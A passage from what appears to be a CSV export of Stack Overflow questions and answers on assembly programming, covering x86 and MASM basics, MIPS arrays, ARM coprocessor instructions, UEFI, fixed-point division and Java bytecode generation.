","<p><code>xp</code> is a pointer. It has a four byte value. That value is pushed onto the stack by the calling function. The function prologue, which you haven't shown sets up a base pointer in <code>ebp</code>. The value of <code>xp</code> is stored at offset 8 relative to that base pointer.</p>

<p>So the first line of code dereferences the base pointer, as indicated by the parentheses, with an offset of 8 to retrieve the <em>value</em> of <code>xp</code> (which is an address that points to an int) and puts it into <code>edx</code>.</p>

<p>The second line of code uses the address in <code>edx</code> to retrieve the value of the <code>int</code>, and puts that value into <code>eax</code>. Note that the function return value will be the value in <code>eax</code>.</p>

<p>The third line dereferences the base pointer, with an offset of 12, to get the value of <code>y</code>.</p>

<p>The fourth line uses the address in <code>edx</code> to place <code>y</code> at the location that <code>xp</code> points to.</p>
","29813943"
"Non-recursive Fibonacci Sequence in Assembly","6003","","<p>In some homework, I have to create a Fibonacci Sequence program in Assembly. I created this code, but it doesn't seem to be working correctly and I am not sure as to why. I believe that I am doing this correctly, but EAX remains ""2"" every loop.</p>

<pre><code>    INCLUDE Irvine32.inc
    .data
        prev DWORD ?
        next DWORD ?
        val DWORD ?
        count DWORD ?
        total DWORD ?

        myMsg BYTE ""Fibonacci Sequence "",0dh,0ah,0

   .code
    main PROC
       mov ecx,15
       mov val,1
       mov prev,-1
       mov eax,1
       mov edx,OFFSET myMsg
       call WriteString

    L1:
       mov count,ecx
       mov ebx,val
       add ebx,prev
       mov total,ebx
       mov ebx,val
       mov prev,ebx
       mov eax,total
       mov val, ebx
       call WriteInt
       call Crlf
       loop L1

    exit
    main ENDP
    END main
</code></pre>
","<p>Could look like this (untested):</p>

<pre><code>    mov  ecx, 15
    mov  eax, 0    ;a = 0
    mov  ebx, 1    ;b = 1
_fib:
    mov  edx, eax 
    add  edx, ebx  ;sum = a + b
    mov  eax, ebx  ;a = b
    mov  ebx, edx  ;b = sum
    loop _fib
</code></pre>
","9610357"
"Push XMM register to the stack","6001","","<p>Is there a way of pushing a packed doubleword integer from XMM register to the stack? and then later on pop it back when needed?<br/></p>

<p>Ideally I am looking for something like PUSH or POP for general purpose registers, I have checked Intel manuals but I either missed the command or there isn't one...<br/></p>

<p>Or will I have to unpack values to general registers and then push them?</p>
","<p>No, there is no such a asm instruction under x86, but you can do something like:</p>

<pre><code>//Push xmm0
sub     esp, 16
movdqu  dqword [esp], xmm0

//Pop xmm0
movdqu  xmm0, dqword [esp]
add     esp, 16
</code></pre>

<p><strong>EDIT:</strong></p>

<p>Upper code sample is direct push/pop emulation. </p>

<p>In case that you are using on stack also other local variables, than the <code>ebp</code> register must be at first properly set, like:</p>

<pre><code>push ebp
mov  ebp, esp
sub  esp, LocaStackVariablesSize
//... your code
mov  esp, ebp
pop  ebp  
ret
</code></pre>

<p>In that case you can also use Daniels solution!</p>
","10162065"
"How do you do a selection sort in MASM Assembly?","5997","","<p>So I'm trying to sort an array in ascending order, and it just doesn't seem to work for me. I know my swap procedure is wrong, and my minIndex procedure only works half the time, but the randomly filled array generates just fine.</p>

<p><strong>Working Code Thanks to vitsoft:</strong></p>

<pre><code>include Irvine32.inc

; Constants
    NUM_INTEGERS = 20
    NUM_RANGE = 99d
    TO_ENSURE_NOT_ZERO = 1d

.data
; Declare Arrays
; Declare Array of 20 Integers
    array byte NUM_INTEGERS dup(?)

; Displayed Annotation for Unsorted Array
    unsortedArrayText byte ""Randomly Generated Array, Unsorted: "", 0dh, 0ah, 0

; Displayed Annotation for Sorted Array
    sortedArrayText byte ""Randomly Generated Array, Sorted from Lowest to Highest: "", 0dh, 0ah, 0

.code
main PROC
; Get Random Values for Array
    call fillArrayRandomly

; Display Array with Annotation
    mov edx, offset unsortedArrayText
    call WriteString

    mov ecx, offset array
    push ecx
    call displayArray

; Sort Array
    mov esi, offset array
    mov ecx, NUM_INTEGERS
    call findMinimum

    mov edi, offset array
    mov ecx, NUM_INTEGERS
    call selectionSort

; Display Sorted Array with Annotation
    mov edx, offset sortedArrayText
    call WriteString

    mov ecx, offset array
    push ecx
    call displayArray

; Exit Program
    exit
main endp

; Fill Array with Random Values
fillArrayRandomly PROC
; Set Counter to NUM_INTEGERS and Index to 0
    mov eax, 0
    mov ecx, NUM_INTEGERS
    mov esi, 0

getRandomNumber:
; Fill Array with Random Numbers and Increment ESI for Offset
    mov ah, NUM_RANGE
    call RandomRange
    add ah, TO_ENSURE_NOT_ZERO

testUniqueness:
    mov al, array [esi]
    cmp al, ah
    jne uniqueNumber
    loop getRandomNumber

uniqueNumber:
    mov array [esi], ah
    inc esi
    loop getRandomNumber

    ret
fillArrayRandomly ENDP

; Display Array
displayArray PROC
    pushad
    mov eax, 0
    mov ecx, NUM_INTEGERS
    mov esi, 0

display:
    mov al, array[esi]
    call WriteDec
    mov al, TAB
    call WriteChar
    inc esi
    loop display

    popad
    call Crlf
    ret
displayArray ENDP

; Selection Sort
selectionSort PROC
    dec ecx
    mov ebx, edi
    mov edx, ecx

startOuterLoop:
    mov edi, ebx
    mov esi, edi
    inc esi
    push ecx
    mov ecx, edx

startInnerLoop:
    mov al, [esi]
    cmp al, [edi]
    pushf
    inc esi
    inc edi
    popf
    jae doNotSwap
    call swap

doNotSwap:
    loop startInnerLoop
    pop ecx
    loop startOuterLoop

    ret
selectionSort ENDP

; Find Minimum Index
findMinimum PROC
    mov edi, esi

minimumIndex:
    mov al, [esi]
    cmp al, [edi]
    jae skip
    mov edi, esi

skip: 
    inc esi
    loop minimumIndex

    ret
findMinimum ENDP

; Swap
swap PROC
    mov al, [esi - 1]
    mov ah, [edi - 1]
    mov [esi - 1], ah
    mov [edi - 1], al

    ret
swap ENDP

END main
</code></pre>
","<pre><code>.data
unsortedArrayText DB ""Randomly Generated Array, Unsorted: "", 0dh, 0ah, 0
sortedArrayText   DB ""Randomly Generated Array, Sorted from Lowest to Highest: "", 0dh, 0ah, 0 
array             DB ""An array of bytes (characters) which will be sorted""
NewLine           DB 0dh, 0ah, 0
NUM_INTEGERS      EQU NewLine - array ; Number of integers (characters) in array  
.code

main PROC
; Display Array with Annotation
; mov edx, offset unsortedArrayText
; call WriteString
ConsoleWrite unsortedArrayText
  ; push offset array
  ; call displayArray
ConsoleWrite array

; Sort Array
  ;   push offset array
  ;   call selectionSort
MOV EDI,array
MOV ECX,NUM_INTEGERS
CALL selectionSort

; Display Sorted Array with Annotation
   ; mov edx, offset sortedArrayText
   ; call WriteString
ConsoleWrite sortedArrayText
   ; push offset array
   ; call displayArray
ConsoleWrite array
; Exit Program
    ;exit
 TerminateProgram
main endp

; Selection Sort
selectionSort PROC ; Bubble sort ECX byte array pointed to with EDI
    DEC ECX        ; Number of compare is NUM_INTEGERS-1
    MOV EBX,EDI    ; Save array pointer to EBX
    MOV EDX,ECX    ; Save number of compare to EDX
OuterLoop:
    MOV EDI,EBX    ; Restore array pointer     
    LEA ESI,[EDI+1] ; Neibourghing field
    PUSH ECX        ; Save OuterLoop counter on stack
     MOV ECX,EDX     ; Initialize InnerLoop counter
InnerLoop:    
     CMPSB ; compare the first byte [EDI] with its neibourgh [ESI], advance EDI,ESI
     JAE NoSwap
     CALL swap
NoSwap:
     LOOP InnerLoop
    POP ECX     ; Restore OuterLoop counter
    LOOP OuterLoop
    RET
selectionSort ENDP

swap PROC ; Swap bytes at [EDI-1] and [ESI-1]
     MOV AL,[ESI-1]
     MOV AH,[EDI-1]
     MOV [ESI-1],AH
     MOV [EDI-1],AL
     RET
swap ENDP
</code></pre>

<p>This worked well, statically defined array was sorted in few miliseconds:</p>

<pre><code>C:\ASM&gt;bubblesortexample.exe
Randomly Generated Array, Unsorted:
An array of bytes (characters) which will be sorted
Randomly Generated Array, Sorted from Lowest to Highest:
        ()Aaaaabbcccdeeeefhhhiillnoorrrrrssstttwwyy
C:\ASM&gt;    
</code></pre>
","22510342"
"x86 CMP Instruction Difference","5986","","<p><strong>Question</strong></p>

<p>What is the (non-trivial) difference between the following two x86 instructions?</p>

<pre><code>39 /r    CMP r/m32,r32   Compare r32 with r/m32
3B /r    CMP r32,r/m32   Compare r/m32 with r32
</code></pre>

<hr>

<p><strong>Background</strong></p>

<p>I'm building a Java assembler, which will be used by my compiler's intermediate language to produce Windows-32 executables.</p>

<p>Currently I have following code:</p>

<pre><code>final ModelBase mb = new ModelBase(); // create new memory model
mb.addCode(new Compare(Register.ECX, Register.EAX)); // add code
mb.addCode(new Compare(Register.EAX, Register.ECX)); // add code

final FileOutputStream fos = new FileOutputStream(new File(""test.exe""));
mb.writeToFile(fos);
fos.close();
</code></pre>

<p>To output a valid executable file, which contains two CMP instruction in a TEXT-section. The executable outputted to ""text.exe"" will do nothing interesting, but that's not the point. The class <code>Compare</code> is a wrapper around the <code>CMP</code> instruction.</p>

<p>The above code produces (inspecting with OllyDbg):</p>

<pre><code>Address   Hex dump                 Command
0040101F  |.  3BC8                 CMP ECX,EAX
00401021  |.  3BC1                 CMP EAX,ECX
</code></pre>

<p>The difference is subtle: if I use the <code>39</code> byte-opcode:</p>

<pre><code>Address   Hex dump                 Command
0040101F  |.  39C1                 CMP ECX,EAX
00401021  |.  39C8                 CMP EAX,ECX
</code></pre>

<p>Which makes me wonder about their synonymity and why this even exists.</p>
","<p>It doesn't matter which opcode you use if you compare two registers. The only difference is when comparing a register with a memory operand, as the opcode used determines which will be subtracted from which.</p>

<p>As for why this exists: The x86 instruction format uses the ModR/M byte to denote either a memory address or a register. Each instruction can only have one ModR/M value, which means it can only access one memory address (not including special instructions like MOVSB). So this means that there can't be a general <code>cmp r/m32, r/m32</code> instruction, and we need two different opcodes: <code>cmp r/m32, r32</code> and <code>cmp r32, r/m32</code>. As a side effect, this creates some redundancy when comparing two registers.</p>
","2760912"
"Check second char of String in Assembly","5969","","<p>I'm using MASM.</p>

<p>I'd like to check the second (and third) character of a String in assembly.</p>

<p>I tried this:</p>

<pre><code>; String is in DWORD operandA
mov eax, OFFSET operandA+1
cmp eax, '!'
je Fact
</code></pre>

<p>This doesn't work. Any advice?</p>
","<p>you'd need to dereference the pointer to get the actual character:</p>

<pre><code>mov eax, OFFSET operandA+1
mov cl,byte ptr [eax]
cmp cl,'!'
</code></pre>

<p>or </p>

<pre><code>mov eax, OFFSET operandA
mov cl,byte ptr [eax + 1]
cmp cl,'!'
</code></pre>

<p>this preserves eax so you can compare the second char using:</p>

<pre><code>inc eax
mov cl,byte ptr [eax]
cmp cl,'?'
</code></pre>

<p>or</p>

<pre><code>mov cl,byte ptr [eax + 2]
cmp cl,'?'
</code></pre>
","8448132"
"Understanding sign and overflow flag in assembly","5953","","<p>This question is about the <code>cmp</code> instruction in assembly. I cannot understand how my books reasoning regarding the <code>SF</code> and <code>OF</code> flags.   </p>

<pre><code> cmp vleft, vright
</code></pre>

<p>According to my book: For signed integers, there are three flags that are important: the zero <code>(ZF)</code> flag, the overflow <code>(OF)</code> flag and the sign <code>(SF)</code> flag. The overflow flag is set if the result of an operation overflows (or underflows). The sign flag is set if the result of an operation is negative. If <code>vleft = vright</code>, the <code>ZF</code> is set (just as for unsigned integers). If <code>vleft &gt; vright</code>, <code>ZF</code> is unset and <code>SF = OF</code>. If <code>vleft &lt; vright</code>, <code>ZF</code> is unset and <code>SF != OF</code>. Do not forget that other instructions can also change the FLAGS register, not just <code>CMP</code>.</p>

<p>First, let's consider the <code>vleft &gt; vright</code> case. My book says the following:</p>

<blockquote>
  <p><em>Why does SF = OF if vleft > vright? If there is no overflow, then the difference will have the correct value and must be non-negative. Thus,
  SF = OF = 0. However, if there is an overflow, the difference will not
  have the correct value (and in fact will be negative). Thus, SF = OF =
  1.</em></p>
</blockquote>

<p>The first part i understand that <code>SF = OF = 0</code>. It could for example be: </p>

<p><code>0111 - 0101 = 0111 + 1010 + 1 = 10010 = 7 - 5 = 2</code> </p>

<p>This would not set the <code>OF</code> or <code>SF</code> flag.</p>

<p>The case could also be:</p>

<p><code>1100 - 0101 = 1100 + 1010 + 1 = 10111 = -4 - 5 = 7 (-9 if we had more bits)</code> </p>

<p>This would not set the <code>SF</code> flag (since the answer is the positive 7) but would set <code>OF = 1</code>, thus <code>SF != OF</code>. This clearly goes against the explanation of my book which says they should be equal.</p>

<p>What am I missing here?</p>

<p>Thank you!</p>
","<p>You are gonna bang your head on the wall, sorry about that :)</p>

<p>In your example, <strong>-4 is not greater than 5</strong>! So yeah, <code>OF</code> will be <code>1</code> and <code>SF</code> will be <code>0</code>, and they won't be equal, and that means -4 is less than 5, and that's correct.</p>

<p>To illustrate the <code>SF = OF = 1</code> case reverse the operands: check if <code>5 &gt; -4</code> by doing </p>

<p><code>5 - (-4) = 5 + 4 = 1001b = -7</code></p>
","14157758"
"Borland x86 inlined assembler; get a label's address?","5940","","<p>I am using Borland Turbo C++ with some inlined assembler code, so presumably Turbo Assembler (TASM) style assembly code. I wish to do the following:</p>

<pre><code>void foo::bar( void )
{
    __asm
    {
      mov eax, SomeLabel
      // ...
    }
    // ...
SomeLabel:
    // ...
}
</code></pre>

<p>So the address of SomeLabel is placed into EAX. This doesn't work and the compiler complains of: Undefined symbol 'SomeLabel'.</p>

<p>In Microsoft Assembler (MASM) the dollar symbol ($) serves as the current location counter, which would be useful for my purpose. But again this does not seem to work in Borlands Assember (expression syntax error).</p>

<p>Update: To be a little more specific, I need the compiler to generate the address it moves into eax as a constant during compilation/linking and not at run time, so it will compile like ""mov eax, 0x00401234"".</p>

<p>Can anybody suggest how to get this working?</p>

<p>UPDATE: To respond to Pax's question (see comment), If the base address is changed at run time by the Windows loader the DLL/EXE PE image will still be relocated by the Windows loader and the labels address will be patched at run time by the loader to use the re-based address so using a compile/link time value for the label address is not an issue.</p>

<p>Many thanks in advance.</p>
","<p>Last time I tried to make some assembly code Borland-compatible I came across the limitation that you can't forward-reference labels.  Not sure if that's what you're running into here.</p>
","210694"
"Converting ASCII number to binary in x86","5934","","<p>So im reading the user's 8-digit input, and saving it into a variable. for example:</p>

<p>Enter an 8-digit hex number: 1ABC5678</p>

<p>So, then i loop through the 1ABC5678 hex number and subtract 48 from numbers 0-9 and subtract 55 from A-F to have a number representation of the input. but that seems to be wrong.
My goal is to convert that 8-digit hex into a octal. I already know how to get from binary to octal, and thats by masking and shifting the 32bit binary digit. But my issue is that my approach to get the binary is wrong.</p>

<p>Im coding on Intel IA-32.
x86.</p>

<h3>UPDAT</h3>

<h3>Now i got a 32 bit binary to the variable name binary. I want to convert it to octal. Any ideas on how to shift 3by3 in order to get the right octal number?</h3>

<p>This is my code so far:</p>

<pre><code>; Now we have the Binary digits saved into the binary variable
; Lets convert into octal

octal_init:
mov     ecx, 11             ; initialize count
mov     edi, octal             ; point to start of new string
mov     eax, [binary]               ; get a character
MOV     edx, 00000000000000000000000000000000b ;Clear EDX

octal_cont:
MOV     dl, al
SHL     dl, 5
SHR     dl, 5

octal_top:
mov     [edi], dl               ; store char in new string
inc     edi                     ; update dest pointer
SHR     eax, 3
dec     ecx                     ; update char count
jnz     octal_cont                  ; loop to top if more chars
</code></pre>

<p>Thank you guys :)</p>
","<p>Some of the problems are:</p>

<ul>
<li>the input string is newline-terminated, not null-terminated</li>
<li>some logic errors</li>
</ul>

<p>You could write it like this:</p>

<pre><code>L1_init:
mov     ecx, 8                  ; initialize count
mov     esi, buf                ; point to start of buffer
mov     edi, binary             ; point to start of new string


L1_top:
mov     al, [esi]               ; get a character
inc     esi                     ; update source pointer

cmp       al, '0'               ; Compare al with ascii '0'
...
or        dl, al                           ; Merge in the four bits just computed
loop      L1_top                          ; Loop back for next byte to convert

mov     [edi], edx               ; store char in new string

L1_end:
</code></pre>

<p>Note that you have already checked that you have 8 chars so no need to do it again in the loop.</p>
","12907912"
"How can I perform 64-bit division with a 32-bit divide instruction?","5928","","<p>This is (AFAIK) a specific question within <a href=""https://stackoverflow.com/questions/2390354/where-can-i-find-soft-multiply-and-divide-algorithms"">this general topic</a>.</p>

<p>Here's the situation:</p>

<p>I have an embedded system (a video game console) based on a 32-bit RISC microcontroller (a variant of NEC's V810). I want to write a fixed-point math library. I read <a href=""http://www.gameprogrammer.com/4-fixed.html"" rel=""nofollow noreferrer"">this article</a>, but the accompanying source code is written in 386 assembly, so it's neither directly usable nor easily modifiable.</p>

<p>The V810 has built-in integer multiply/divide, but I want to use the 18.14 format mentioned in the above article. This requires dividing a 64-bit int by a 32-bit int, and the V810 only does (signed or unsigned) 32-bit/32-bit division (which produces a 32-bit quotient and a 32-bit remainder).</p>

<p>So, my question is: how do I simulate a 64-bit/32-bit divide with a 32-bit/32-bit one (to allow for the pre-shifting of the dividend)? Or, to look at the problem from another way, what's the best way to divide an 18.14 fixed-point by another using standard 32-bit arithmetic/logic operations? (""best"" meaning fastest, smallest, or both).</p>

<p>Algebra, (V810) assembly, and pseudo-code are all fine. I will be calling the code from C.</p>

<p>Thanks in advance!</p>

<p>EDIT: Somehow I missed <a href=""https://stackoverflow.com/questions/1870158/unsigned-128-bit-division-on-64-bit-machine"">this question</a>... However, it will still need some modification to be super-efficient (it has to be faster than the floating-point div provided by the v810, though it may already be...), so feel free to do my work for me in exchange for reputation points ;) (and credit in my library documentation, of course).</p>
","<p>GCC has such a routine for many processors, named _divdi3 (usually implemented using a common divmod call). <a href=""http://www.ic.unicamp.br/~islene/2s2008-mo806/libc/sysdeps/wordsize-32/divdi3.c"" rel=""noreferrer"">Here's one</a>. Some Unix kernels have an implementation too, e.g. <a href=""http://freebsd.active-venture.com/FreeBSD-srctree/newsrc/libkern/qdivrem.c.html"" rel=""noreferrer"">FreeBSD</a>.</p>
","3573065"
"GCC NOPs being compiled away","5920","","<p>Venturing out of my usual VC++ realm into the world of GCC (via MINGW32). Trying to create a Windows PE that consists largely of NOPs, ala:</p>

<pre><code>for(i = 0; i &lt; 1000; i++)
{
    asm(""nop"");
}
</code></pre>

<p>But either I'm using the wrong syntax or the compiler is optimising through them because those NOPs don't survive the compilation process.</p>

<p>I'm using the -O0 flag, otherwise defaults. Any ideas on how I can coax the compiler into leaving the NOPs intact?</p>
","<p>Are you expecting it to unroll the loop in to 1000 <code>nop</code>s?  I did a quick test with <code>gcc</code> and I don't see the (one) <code>nop</code> disappear:</p>

<pre><code>        xorl    %eax, %eax
        .p2align 4,,7
.L2:
#APP
        nop
#NO_APP
        addl    $1, %eax
        cmpl    $1000, %eax
        jne     .L2
</code></pre>

<p>With <code>gcc -S -O3 -funroll-all-loops</code> I see it unroll the loop 8 times (thus 8 <code>nop</code>) but I think if you want 1000 it's going to be easiest to do:</p>

<pre><code>#define NOP10() asm(""nop;nop;nop;nop;nop;nop;nop;nop;nop;nop"")
</code></pre>

<p>And then use <code>NOP10(); ...</code></p>
","4567244"
"NASM Assembly converting from ASCII to decimal","5917","","<p>I know you can add 48 to convert from decimal to ascii or subtract 48 to convert from ascii to decimal, but why does the following code also perform this same conversion?</p>

<pre><code>; moving the first number to eax register and second number to ebx
; and subtracting ascii '0' to convert it into a decimal number
mov eax, [number1]
sub eax, '0'
</code></pre>

<p>and</p>

<pre><code>; add '0' to to convert the sum from decimal to ASCII
add eax, '0'
</code></pre>
","<p>The <code>'0'</code> works identically to <code>48</code> because <code>'0'</code> is the code point for the <em>character</em> <code>0</code> which, in ASCII, is indeed <code>48</code>.</p>

<p>Hence all of these are equivalent:</p>

<pre><code>sub  al, 48          ; decimal
sub  al, '0'         ; character code
sub  al, 30h         ; hex
sub  al, 0x30        ; hex again
sub  al, 60q         ; octal
sub  al, 00110000b   ; binary
</code></pre>

<hr>

<p>An keep in mind that this method only works for a value from <code>0</code> to <code>9</code> inclusive. If you want to handle values above nine, you'll need to decompose the value into individual digits and process them one at a time.</p>
","31646978"
"array on MIPS Assembly","5902","","<p>i'm trying to write a mips function wich return the position of the maximum value but i'm gettin this exeption <em>(Error in /home/ams/Bureau/part2a line 21: Runtime exception at 0x00400028: address out of range 0x00000000)</em></p>

<pre><code># MIPS assembly code

# $s0 = array base address, $s1 = i
# initialization code

main: lui  $s0, 0x23B8           # $s0 = 0x23B80000
     ori  $s0, $s0, 0xF000   # $s0 = 0x23B8F000
     addi $s1, $0, 0            # i = 0
     addi $t2, $0, 1000      # $t2 = 1000
     addi $t3, $0, 0            # $t3 =   max
     addi $s4, $0 , 0           #  $s4 = max indice

max:
loop: slt  $t0, $s1, $t2      # i &lt; 1000?
     beq  $t0, $0, done      # if not then done
     sll $t0, $s1, 2              # $t0 = i * 4 
     add  $t0, $t0, $s0      # address of array[i]


     lw   $t1, 0($t0)        # $t1 = array[i] ERROR HERE 
     slt $t5, $t3, $t1      # max &lt; array[i]
     beq $t5, $0,else   # if not then ense
     addi $t3,$t1, 0    # $t3 =: array[i]
     addi $s4, $s1,0    # $s4 =: i 
     #end

     else:   
     addi $s1, $s1, 1        # i = i + 1
     j    loop               # repeat

done: 
    addi  $v0, $s4, 0        # retval = max
    jr    $ra                # Return
</code></pre>

<p>any suggestion please ?</p>
","<p>You are setting $s1 to 0, and then trying to dereference it. Perhaps you meant $t0?</p>

<pre><code>lw   $t1, 0($t0)
</code></pre>
","5388554"
"Understanding MRC on ARM7","5902","","<p>I am new to ARM and trying to understand MRC instruction.</p>

<p>As I understood , MRC is to read Coprocessor registers and put it into main Core register.</p>

<p>Now Coprocessors are attached to main core and is used to control the memory subsystem of main core.How Coprocessors are attached to main core processor .Could anyone point to some good Digram?</p>

<p>Now this below instruction on arm7 cpu core </p>

<pre><code>  /* workaround to disable secure state */
     mrc     p15, #0, r0, c1, c1, #0
     orr     r0, r0, #1
     mcr     p15, #0, r0, c1, c1, #0
     isb
</code></pre>

<p>Now I just couldn't find what is going on in mrc instruction here</p>

<p>1.First argument to mrc is coprocessor number(how p0 is different from p15).</p>

<p>2.Second Argument is opcode1 of coprocessor(Not sure about it).</p>

<p>3.Third argument is main core register(Ok with it).</p>

<p>4.fourth and fivth argumnet is co processor registers(Is result of c1,#0 is stored to c1 )?</p>

<p>5.Agin final Argument is opcode2 (Not sure about it).</p>

<p>Thanks</p>
","<p><strong>Coprocessor</strong> in ARM is a misleading notion. It's shorthand for an optional piece of functionality that is not exposed via the core instruction set. ARM CPUs are modular. There are bits and pieces of CPU hardware that implementers of the architecture may or may not place on the chip. The memory management unit (MMU) is one example; there are others, such is the hardware debugging facility. Those are, indeed, identified by coprocessor number (<code>pXX</code>), so that more than one coprocessor can be present at the same time. The coprocessor number for MMU is traditionally p15. Coprocessors p0..p14 have nothing to do with memory management and may not be present. The debugging subsystem, for example, is p14.</p>

<p>The MRC and MCR commands are used to send commands to coprocessors. The mnemonic is, again, somewhat misleading - the effect of a command can be more than just a register move. It's more like MRC stands for ""send a command to a coprocessor and get some data back"" and MCR is ""send a command to a coprocessor and pass some data along"". Think of it that way. That's what the opcodes are for - that's the command to the coprocessor. Sometimes, a MCR/MRC command with a particular coproc # and opcode would even get separate mnemonic in the assembler (e. g. FPU commands).</p>

<p>The exact specifics of coprocessor opcodes and register numbers vary from one copropcessor to another. Since it's the MMU that you're interested in, read up on that particular one; it'll explain how do specific operations map to opcodes and coproc register numbers.</p>
","19548054"
"Writing an OS with UEFI","5895","","<p>I haven't been coding much lately due to school but I've decided I want to start working on OS development again. Recently however I've heard stuff about EFI as the replacement to BIOS. I want to develop an OS for a platform that uses EFI rather than BIOS. I'm having trouble figuring out where to start though. Can anyone point me in the right direction? Maybe explain what EFI means to OS development and maybe tell me what testing environments (preferably virtual) I can use. Quite frankly, I'm not really sure exactly what EFI is. Also should I invest time looking into ARM assembly? I know x86 Assembly but I feel as that is becoming outdated as well. I'm really lost and I would love to hear your input.</p>

<p>Thanks</p>
","<p>EFI is the precursor to UEFI, which is what people actually use, although they still sometimes refer to the thing as EFI. You can get the specifications involved at <a href=""http://www.uefi.org/home/"" rel=""noreferrer"">uefi.org</a>.</p>

<p>The UEFI Specification defines everything a <strong>boot loader</strong> might need to know. The PI Specifications define interfaces for silicon vendors to use for portability of their code in the industry. So you will hear about an OS, like Win8, requiring compliance with a certain version of the UEFI Specification, like 2.3.1c, for some features to work, like secure boot. All this goes to say that EFI does not replace BIOS so much as become a standard to which the BIOS must comply to support some operating systems.</p>

<p>The place to go to get started (after you get a copy of the specifications) is <a href=""http://sourceforge.net/apps/mediawiki/tianocore/index.php?title=Welcome"" rel=""noreferrer"">the TianoCore project on SourceForge</a>. One of the projects there is <a href=""http://sourceforge.net/apps/mediawiki/tianocore/index.php?title=OVMF"" rel=""noreferrer"">OVMF</a>, which is a virtual machine target for UEFI. You may also want to look at the NT32 target for running a command prompt under windows. These are really great tools to use when you want to design an application, like a boot loader, that sits on top of the UEFI interfaces.</p>

<p>As far as learning assembly, I don't recommend you start there. There is so much to know, and part of the reason that we created UEFI is so that new programmers could work in C instead of ASM. There are a few places in UEFI where we use ASM, but the build system handles the details for splicing that in, and you generally don't need either the tricky control of the state of the processor or the performance you would get from writing the ASM. The only other reason you would do it is size, and since the rest of the BIOS is going to be in C, it sort of defeats the purpose unless you rewrite the whole thing in ASM, which no one is going to do. Focus on learning the specifications and how to use them to write your own UEFI applications.</p>
","12927553"
"Improving field get and set performance with ASM or Javassist","5888","","<p>I would like to avoid reflection in an open source project I am developing. Here I have classes like the following.</p>

<pre><code>public class PurchaseOrder {

   @Property
   private Customer customer;

   @Property
   private String name;
}
</code></pre>

<p>I scan for the <code>@Property</code> annotation to determine what I can set and get from the PurchaseOrder reflectively. There are many such classes all using <code>java.lang.reflect.Field.get()</code> and <code>java.lang.reflect.Field.set()</code>.</p>

<p>Ideally I would like to generate for each property an invoker like the following.</p>

<pre><code>public interface PropertyAccessor&lt;S, V&gt; {
   public void set(S source, V value);
   public V get(S source);
}
</code></pre>

<p>Now when I scan the class I can create a static inner class of <code>PurchaseOrder</code> like so.</p>

<pre><code>static class customer_Field implements PropertyAccessor&lt;PurchaseOrder, Customer&gt; {
   public void set(PurchaseOrder order, Customer customer) {
      order.customer = customer;
   }  
   public Customer get(PurchaseOrder order) {
      return order.customer;
   }
}
</code></pre>

<p>With these I totally avoid the cost of reflection. I can now set and get from my instances with native performance. Can anyone tell me how I would do this. A code example would be great. I have searched the net for a good example but can find nothing like this. The ASM and Javasist examples are pretty poor also.</p>

<p>The key here is that I have an interface that I can pass around. So I can have various implementations, perhaps one with Java Reflection as a default, one with ASM, and one with Javassist?</p>

<p>Any help would be greatly appreciated.</p>
","<p><strong>ASM</strong></p>

<p>Using <code>ASMifierClassVisitor</code>, you can see exactly what code you need to write to generate the inner classes:</p>

<pre><code>ASMifierClassVisitor.main(new String[] { PurchaseOrder.customer_Field.class
    .getName() });
</code></pre>

<p>The rest is just determining what bits you need to parameterize in your generator code. Example output for <code>PurchaseOrder$customer_Field</code> which will become the file <code>inject/PurchaseOrder$customer_Field.class</code>:</p>

<pre><code>public static byte[] dump () throws Exception {

  ClassWriter cw = new ClassWriter(0);
  FieldVisitor fv;
  MethodVisitor mv;
  AnnotationVisitor av0;

  cw.visit(V1_6, ACC_SUPER, ""inject/PurchaseOrder$customer_Field"",
      ""Ljava/lang/Object;""+
      ""Linject/PropertyAccessor&lt;Linject/PurchaseOrder;Linject/Customer;&gt;;"", 
      ""java/lang/Object"",
      new String[] { ""inject/PropertyAccessor"" });
//etc
</code></pre>

<p><em>(I used ""inject"" as the package.)</em></p>

<p>You'll also have to create synthetic accessors using ASM's visitor classes:</p>

<pre><code>{
mv = cw.visitMethod(ACC_STATIC + ACC_SYNTHETIC, ""access$0"", 
          ""(Linject/PurchaseOrder;Linject/Customer;)V"", null, null);
mv.visitCode();
mv.visitVarInsn(ALOAD, 0);
mv.visitVarInsn(ALOAD, 1);
mv.visitFieldInsn(PUTFIELD, ""inject/PurchaseOrder"",
          ""customer"", ""Linject/Customer;"");
mv.visitInsn(RETURN);
mv.visitMaxs(2, 2);
mv.visitEnd();
}
{
mv = cw.visitMethod(ACC_STATIC + ACC_SYNTHETIC, ""access$1"", 
          ""(Linject/PurchaseOrder;)Linject/Customer;"", null, null);
mv.visitCode();
mv.visitVarInsn(ALOAD, 0);
mv.visitFieldInsn(GETFIELD, ""inject/PurchaseOrder"", ""
          customer"", ""Linject/Customer;"");
mv.visitInsn(ARETURN);
mv.visitMaxs(1, 1);
mv.visitEnd();
}
</code></pre>

<p>See <a href=""http://illegalargumentexception.blogspot.com/2008/12/java-automating-object-equality.html"" rel=""noreferrer"">this project</a> for an example of how to inject methods.</p>

<hr>

<blockquote>
  <p>With these I totally avoid the cost of reflection.</p>
</blockquote>

<p>Since this is all going to be done at runtime:</p>

<ul>
<li>there is an up-front cost to this parsing and code generation</li>
<li>you'll need to discover and introspect these generated types somehow</li>
</ul>
","3044692"
"MASM32, display string and integer","5887","","<p>I am using MASM32 (version 10), and I would like to know what is the easiest way to output a string and an integer on screen. Please provide the full source code, and not just the specific lines.</p>

<p>Thank you.</p>

<p>Edit:</p>

<pre><code>.386
.model flat, stdcall
.stack
.data
stest db ""This is a test"", 0
.code
main proc
    mov ah, 09h
    lea dx, stest
    int 21h
main endp
end main
</code></pre>

<p>It crash without outputting anything. I tried several other things, with different problems, the only common thing is that I don't get the string displayed on screen :)</p>
","<p>Note that int21/09 requires the string to be terminated by a dollar sign ($).
Also, even if your code did print something, it would crash immediately afterward since you don't terminate your program at all (see int21/4c) so it continues executing undefined memory. Depending on memory model and environment, you might also have to set up the segment registers and the stack for yourself first. All of this assumes that you indeed have access to int21 services to start with.</p>

<p>Finally, as a general advice, get a debugger working and trace your program.</p>
","4572789"
"Illegal instruction in ASM: lock cmpxchg dest, src","5881","","<p>I've been messing around with some x86 assembly as its come up in a number of my classes. In particular, I've wanted to expose compare-and-swap (CAS) as a user function. This is with the intent that I can implement my own locks.</p>

<p>I'm using Linux 2.6.31 with GCC 4.1.1 on an Intel CPU.</p>

<p>I have the following:</p>

<pre><code>// int cmpxchg(int *dest, int expected, int update)
.globl cmpxchg
cmpxchg:
  pushl %ebp
